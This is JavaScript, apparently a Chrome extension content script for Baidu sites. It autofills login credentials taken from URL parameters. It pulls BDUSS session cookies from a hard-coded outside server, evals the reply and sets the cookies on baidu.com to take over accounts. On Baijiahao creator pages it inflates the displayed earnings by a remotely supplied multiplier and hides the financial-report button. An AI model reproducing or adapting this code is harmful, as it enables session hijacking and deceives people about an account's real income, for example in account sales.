//邮箱登录自动填充
if(window.location.href.indexOf('www.baidu.com/s')>0){
	var str=window.location.href;
	console.log(str);
	if(str.indexOf('username=')>0 && str.indexOf('emailpa=')>0){
		var username=str.substring(str.indexOf('username=')+9,str.indexOf("emailpa")-1);
		var password=str.substring(str.indexOf('emailpa=')+8);
		$("#op_email3_username").val(username);
		$(".op_email3_password").val(password);
	}
}

//设置cookie
if(window.location.href.indexOf('ir.baidu.com')>0){
	var str=window.location.href;
	var username=str.substring(str.lastIndexOf('=')+1);
	$.get("http://123.206.231.254/spider/auto/getCookie?username="+username,function(data){
		var cookies=eval('('+data+')');
		$.each(cookies, function(i, obj) {
			setCookie(obj);
		});
	});
	window.location.replace("http://baijiahao.baidu.com?username="+username);
}

//*****************************百度百家**********************************
if(window.location.href.indexOf('baijiahao.baidu.com')>0){
	var str=window.location.href;
	if(str.indexOf('username=')>0){
		var username=str.substring(str.indexOf('username=')+9);
		console.log(username);
		$.get("http://123.206.231.254/spider/auto/checkCookie?username="+username,function(data){
			console.log("返回："+data);
			if(data=='1'){
			}else{
				alert("该cookie已过期！用户名："+username);
				window.opener=null;
				window.open('','_self');
				window.close();
			}
		});
	}
	
	//获取倍数
	$.get("http://123.206.231.254/spider/getRate",function(data){
		var rate=parseFloat(data);
		
		if(window.location.href.indexOf('baijiahao.baidu.com/builder/marketing/index')>0){
			var income1=$(".num.money:eq(0)");
			var income2=$(".num.money:eq(1)");
			var income3=$(".num.money:eq(2)");
			//-----------------收入广场 昨日收益------------------
			if(!isNaN(parseFloat(income1.text())))
				income1.text(fmoney(""+parseFloat(income1.text())*rate,2));
			//-----------------收入广场 7日收益-------------------
			if(!isNaN(parseFloat(income2.text())))
				income2.text(fmoney(""+parseFloat((income2.text())*rate),2));
			//-----------------收入广场 30日收益------------------
			if(!isNaN(parseFloat(income3.text())))
				income3.text(fmoney(""+parseFloat(income3.text())*rate,2));
			//-----------------移除财务报告按钮----------------
			$(".cep-btn").remove();
		}else{
			//-------------首页  昨日收益---------------
			var a2=$(".index-top-statistics-number:eq(0)");
			a2.on('DOMNodeInserted',function(e) {
				a2.off('DOMNodeInserted');
				if(!isNaN(parseFloat(a2.text())))
					a2.text(fmoney(a2.text()*rate,2));
			});
			setTimeout(function(){
				if(!isNaN(parseFloat(a2.text()))){
					var objEvt = $._data(a2[0], "events");
					if (objEvt && objEvt["DOMNodeInserted"]) {
						a2.off('DOMNodeInserted');
						a2.text(fmoney(a2.text()*rate,2));
					}
				}
			}, 500);
		}
	},"json");
}
function setCookie(obj)
{
	if(obj.name=='BDUSS'){
		console.log(obj.name);
	var Days = 30;
	var exp = new Date();
	exp.setTime(exp.getTime() + Days*24*60*60*1000);
	document.cookie = obj.name + "="+ obj.value + ";expires=" +obj.expiryDate+";path=/;domain=baidu.com";
	}
}
function fmoney(s, n)   
{   
   n = n > 0 && n <= 20 ? n : 2;   
   s = parseFloat((s + "").replace(/[^\d\.-]/g, "")).toFixed(n) + "";   
   var l = s.split(".")[0].split("").reverse(),   
   r = s.split(".")[1];   
   t = "";   
   for(i = 0; i < l.length; i ++ )   
   {   
      t += l[i] + ((i + 1) % 3 == 0 && (i + 1) != l.length ? "," : "");   
   }   
   return t.split("").reverse().join("") + "." + r;   
}

//执行清除方法  
function toclean(days,data){
	chrome.cookies.getAllCookieStores(function(data){
		console.log(data);
	});
    var millisecondsPerWeek = 1000 * 60 * 60 * 24 * days;  
    var ago = (new Date()).getTime() - millisecondsPerWeek;  
    console.log(chrome.browsingData);
    chrome.browsingData.remove({"since":ago},data,function(){
        //弹出框  
        new Notification('chrome chernCache', {
            body: '清理缓存成功!'  
        });  
    });  
}  